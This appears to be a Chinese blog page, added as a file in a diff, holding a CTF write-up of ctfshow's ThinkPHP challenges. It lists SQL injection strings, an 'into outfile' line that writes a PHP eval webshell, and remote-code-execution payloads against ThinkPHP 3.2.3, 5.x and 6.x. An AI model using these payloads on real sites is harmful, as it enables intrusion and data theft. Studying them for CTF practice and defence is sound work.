@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="569 URL模式查阅手册：URL模式 · ThinkPHP3.2.3完全开发手册 http:&#x2F;&#x2F;serverName&#x2F;index.php&#x2F;模块&#x2F;控制器&#x2F;操作">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow web入门(thinkphp专题)">
+<meta property="og:url" content="http://example.com/2022/01/10/ctfshow%20web%E5%85%A5%E9%97%A8(thinkphp%E4%B8%93%E9%A2%98)/index.html">
+<meta property="og:site_name" content="Y0ng的博客">
+<meta property="og:description" content="569 URL模式查阅手册：URL模式 · ThinkPHP3.2.3完全开发手册 http:&#x2F;&#x2F;serverName&#x2F;index.php&#x2F;模块&#x2F;控制器&#x2F;操作">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/42abd33294b94f0fbd71e7cad82f724b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/fee6480bb0fb4021b66f3d2fe546576c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9d254a053288459f977a73f00b92fe60.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/81f723f20b4b44018b75c9236241a167.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e8244c68d5d04de782a3301db3eb2902.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3304d7962e7e4ca290f8a1dbc2f3b4d8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/8d8741371f6e4d5aa07829ccdc7c6156.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2af3379b6b45455eb8c473f5d035e298.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/29e1a39a7d734394b73598cb92346bf5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3fee18bc900f4c2eacee580cd21e7cd8.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f29cbb2c61d64cd08d79372209f63582.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/bed87652227f4ae88f9901235b4c01cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3b3838c3107a4ab6803c32ecd605b5c9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/5e750a42b16d4bf4ae0feb7b1e30f01e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f40c380fe2bd430d8e0244967d691a7e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a73882e6f2f14fc888f79cbbe47ce44d.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c7621f5e06b445128c4e1dd7a8f53385.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/cd802811520740528d9fee55be6998ca.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="article:published_time" content="2022-01-09T16:43:00.298Z">
+<meta property="article:modified_time" content="2022-01-09T16:42:52.618Z">
+<meta property="article:author" content="Y0ng">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/42abd33294b94f0fbd71e7cad82f724b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+
+<link rel="canonical" href="http://example.com/2022/01/10/ctfshow%20web%E5%85%A5%E9%97%A8(thinkphp%E4%B8%93%E9%A2%98)/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ctfshow web入门(thinkphp专题) | Y0ng的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Y0ng的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">0</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">17</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">127</span></a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/10/ctfshow%20web%E5%85%A5%E9%97%A8(thinkphp%E4%B8%93%E9%A2%98)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cys.jpg">
+      <meta itemprop="name" content="Y0ng">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfshow web入门(thinkphp专题)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-01-10 00:43:00 / 修改时间：00:42:52" itemprop="dateCreated datePublished" datetime="2022-01-10T00:43:00+08:00">2022-01-10</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="569-URL模式"><a href="#569-URL模式" class="headerlink" title="569 URL模式"></a>569 URL模式</h1><p><img src="https://img-blog.csdnimg.cn/42abd33294b94f0fbd71e7cad82f724b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br>查阅手册：<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp/1697">URL模式 · ThinkPHP3.2.3完全开发手册</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;serverName&#x2F;index.php&#x2F;模块&#x2F;控制器&#x2F;操作</span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
+<p>payload: </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">普通模式：&#x2F;?m&#x3D;Admin&amp;c&#x3D;Login&amp;a&#x3D;ctfshowLogin</span><br><span class="line">Pathinfo模式：&#x2F;index.php&#x2F;Admin&#x2F;Login&#x2F;ctfshowLogin</span><br><span class="line">兼容模式：&#x2F;?s&#x3D;&#x2F;Admin&#x2F;Login&#x2F;ctfshowLogin</span><br></pre></td></tr></table></figure>
+
+<h1 id="570-路由"><a href="#570-路由" class="headerlink" title="570 路由"></a>570 路由</h1><p>发现路由：</p>
+<p><img src="https://img-blog.csdnimg.cn/fee6480bb0fb4021b66f3d2fe546576c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>根据手册：<br><img src="https://img-blog.csdnimg.cn/9d254a053288459f977a73f00b92fe60.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>直接构造：这里直接执行不可以，执行两次</p>
+<p><img src="https://img-blog.csdnimg.cn/81f723f20b4b44018b75c9236241a167.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<h1 id="571-黑客建立了控制器后门"><a href="#571-黑客建立了控制器后门" class="headerlink" title="571 黑客建立了控制器后门"></a>571 黑客建立了控制器后门</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/devi1/p/13486655.html">Thinkphp3.2.3安全开发须知</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.yongsheng.site/2022/01/09/ThinkPHP%20show%E6%96%B9%E6%B3%95%E5%8F%82%E6%95%B0%E5%8F%AF%E6%8E%A7%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">show 方法参数可控</a></p>
+<h1 id="572-日志路径"><a href="#572-日志路径" class="headerlink" title="572 日志路径"></a>572 日志路径</h1><p>Thinkphp3 日志路径</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;21_04_15.log</span><br></pre></td></tr></table></figure>
+
+<h1 id="573-574-v3-2-3-find-sql注入"><a href="#573-574-v3-2-3-find-sql注入" class="headerlink" title="573-574 v3.2.3 find sql注入"></a>573-574 v3.2.3 find sql注入</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?id[where]&#x3D;1 and updatexml(1,concat(0x7e,right((select group_concat(flag4s) from flags),22),0x7e),1)</span><br><span class="line"></span><br><span class="line">?id&#x3D;-1) union select 1,group_concat(flag4s),3,4 from flags%23</span><br></pre></td></tr></table></figure>
+
+<h1 id="web575"><a href="#web575" class="headerlink" title="web575"></a>web575</h1><p><a target="_blank" rel="noopener" href="http://www.yongsheng.site/2021/08/30/ThinkPHP3.2.3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP 3.2.3 反序列化&amp;sql注入漏洞分析</a></p>
+<p>先利用恶意数据库读取题目中使用的数据库信息</p>
+<p><img src="https://img-blog.csdnimg.cn/e8244c68d5d04de782a3301db3eb2902.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>修改exp</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;table&quot; &#x3D;&gt; &quot;ctfshow_users where 1&#x3D;2;select \&quot;&lt;?php eval(\$_POST[0]);?&gt;\&quot; into outfile \&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php\&quot;#&quot;,</span><br></pre></td></tr></table></figure>
+
+<h1 id="576"><a href="#576" class="headerlink" title="576"></a>576</h1><p><a target="_blank" rel="noopener" href="http://www.yongsheng.site/2022/01/09/ThinkPHP%20v3.2%20comment%20%E6%B3%A8%E9%87%8A%E6%B3%A8%E5%85%A5%20%E5%86%99shell/">comment 注释注入写shell</a></p>
+<h1 id="Web577"><a href="#Web577" class="headerlink" title="Web577"></a>Web577</h1><p>Thinkphp3.2.3 exp注入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id[0]&#x3D;exp&amp;id[1]&#x3D;&#x3D;-1 union select 1,group_concat(flag4s),3,4 from flags</span><br></pre></td></tr></table></figure>
+
+<h1 id="web578"><a href="#web578" class="headerlink" title="web578"></a>web578</h1><p>变量覆盖导致rce</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function index($name&#x3D;&#39;&#39;,$from&#x3D;&#39;ctfshow&#39;)&#123;</span><br><span class="line">$this-&gt;assign($name,$from);</span><br><span class="line">$this-&gt;display(&#39;index&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>跟那个ThinkPHP 3.2.x RCE 差不多</p>
+<p>分析这个<code>assign两个参数可控</code></p>
+<p><img src="https://img-blog.csdnimg.cn/3304d7962e7e4ca290f8a1dbc2f3b4d8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>进入display再进入fetch方法，题目用的时php模板</p>
+<p><img src="https://img-blog.csdnimg.cn/8d8741371f6e4d5aa07829ccdc7c6156.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>extract直接覆盖变量$_content</p>
+<p>那就在assign有两条路，传入的是字符串或者直接传入数组形式</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;_content&amp;from&#x3D;&lt;?php system(&#39;cat &#x2F;fl*&#39;);?&gt;</span><br><span class="line">或者</span><br><span class="line">?name[_content]&#x3D;&lt;?php phpinfo();?&gt;&amp;from&#x3D;123</span><br></pre></td></tr></table></figure>
+
+<p>那个3.2.3rce的是在Think模板下，这道题在分析相较简单</p>
+<h1 id="Web579-610-TP5-rce"><a href="#Web579-610-TP5-rce" class="headerlink" title="Web579-610 TP5 rce"></a>Web579-610 TP5 rce</h1><p>开始thinkphp5 rce</p>
+<p>payload一大堆</p>
+<h1 id="web606"><a href="#web606" class="headerlink" title="web606"></a>web606</h1><p>前几个题找几个payload就行了，到这一道题 input write invokefunction display被过滤，但是<code>大写</code>就绕过了</p>
+<p>一个新的通杀:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?s&#x3D;index&#x2F;\think\view\driver\Think&#x2F;__call&amp;method&#x3D;display&amp;params[]&#x3D;&lt;?php system(&#39;whoami&#39;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/2af3379b6b45455eb8c473f5d035e298.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>生成shell拼接道$content进行write写入缓存文件</p>
+<p><img src="https://img-blog.csdnimg.cn/29e1a39a7d734394b73598cb92346bf5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p><img src="https://img-blog.csdnimg.cn/3fee18bc900f4c2eacee580cd21e7cd8.png#pic_center"></p>
+<p>接着去读取，include模板缓存文件</p>
+<p><img src="https://img-blog.csdnimg.cn/f29cbb2c61d64cd08d79372209f63582.png#pic_center"><br><img src="https://img-blog.csdnimg.cn/bed87652227f4ae88f9901235b4c01cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<h1 id="611-TP-5-1-反序列化"><a href="#611-TP-5-1-反序列化" class="headerlink" title="611 TP 5.1 反序列化"></a>611 TP 5.1 反序列化</h1><p>thinkphp 5.1.38反序列化RCE</p>
+<p><a target="_blank" rel="noopener" href="http://www.yongsheng.site/2022/01/04/ThinkPHP%20v5.1.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%88%86%E6%9E%90/">ThinkPHP v5.1.x 反序列化 分析</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.yongsheng.site/2021/11/29/%E5%AE%89%E6%B4%B5%E6%9D%AF/">安洵杯 | Y0ng的博客</a></p>
+<h1 id="612-622-5-1变形"><a href="#612-622-5-1变形" class="headerlink" title="612-622 5.1变形"></a>612-622 5.1变形</h1><p>从这道题往后就是 <code>围绕怎么调用input函数或者param来做文章</code> ，直接搜索谁调用input，然后进行分析即可</p>
+<p>调用 <code>param</code> 的：</p>
+<p><img src="https://img-blog.csdnimg.cn/3b3838c3107a4ab6803c32ecd605b5c9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;var_pjax&#39;         &#x3D;&gt; &#39;&#39;,</span><br><span class="line">$this-&gt;hook &#x3D; [&#39;visible&#39;&#x3D;&gt;[$this,&quot;isPjax&quot;]];</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/5e750a42b16d4bf4ae0feb7b1e30f01e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$this-&gt;get &#x3D; [&#39;y0ng&#39;&#x3D;&gt;&#39;whoami&#39;];</span><br><span class="line">$this-&gt;hook &#x3D; [&#39;visible&#39;&#x3D;&gt;[$this,&quot;__get&quot;]];</span><br></pre></td></tr></table></figure>
+
+<p>调用 <code>input</code> 的：</p>
+<p><img src="https://img-blog.csdnimg.cn/f40c380fe2bd430d8e0244967d691a7e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$this-&gt;hook &#x3D; [&#39;visible&#39;&#x3D;&gt;[$this,&quot;request&quot;]];  直接url传参数即可</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/a73882e6f2f14fc888f79cbbe47ce44d.png#pic_center"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$this-&gt;route &#x3D; [&#39;y0ng&#39;&#x3D;&gt;&#39;whoami&#39;];</span><br><span class="line">$this-&gt;hook &#x3D; [&#39;visible&#39;&#x3D;&gt;[$this,&quot;route&quot;]];</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/c7621f5e06b445128c4e1dd7a8f53385.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p><img src="https://img-blog.csdnimg.cn/cd802811520740528d9fee55be6998ca.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<h1 id="623-625-TP6-反序列化"><a href="#623-625-TP6-反序列化" class="headerlink" title="623-625 TP6 反序列化"></a>623-625 TP6 反序列化</h1><p>有个奇怪的地方，题目显示的是6.0.8 但是应该是打不通的，所以题目版本应该错了，用6.0.3就可以了</p>
+<p><a target="_blank" rel="noopener" href="http://www.yongsheng.site/2021/11/25/ThinkPHP%206.0.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">ThinkPHP v6.0.x 反序列化漏洞 分析</a></p>
+<p>用6.0.9链子 有两种 一种直接eval 或者 还可以写文件</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/01/09/ThinkPHP%20v3.2%20comment%20%E6%B3%A8%E9%87%8A%E6%B3%A8%E5%85%A5%20%E5%86%99shell/" rel="prev" title="ThinkPHP v3.2 comment 注释注入写shell">
+      <i class="fa fa-chevron-left"></i> ThinkPHP v3.2 comment 注释注入写shell
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#569-URL%E6%A8%A1%E5%BC%8F"><span class="nav-number">1.</span> <span class="nav-text">569 URL模式</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#570-%E8%B7%AF%E7%94%B1"><span class="nav-number">2.</span> <span class="nav-text">570 路由</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#571-%E9%BB%91%E5%AE%A2%E5%BB%BA%E7%AB%8B%E4%BA%86%E6%8E%A7%E5%88%B6%E5%99%A8%E5%90%8E%E9%97%A8"><span class="nav-number">3.</span> <span class="nav-text">571 黑客建立了控制器后门</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#572-%E6%97%A5%E5%BF%97%E8%B7%AF%E5%BE%84"><span class="nav-number">4.</span> <span class="nav-text">572 日志路径</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#573-574-v3-2-3-find-sql%E6%B3%A8%E5%85%A5"><span class="nav-number">5.</span> <span class="nav-text">573-574 v3.2.3 find sql注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web575"><span class="nav-number">6.</span> <span class="nav-text">web575</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#576"><span class="nav-number">7.</span> <span class="nav-text">576</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web577"><span class="nav-number">8.</span> <span class="nav-text">Web577</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web578"><span class="nav-number">9.</span> <span class="nav-text">web578</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" 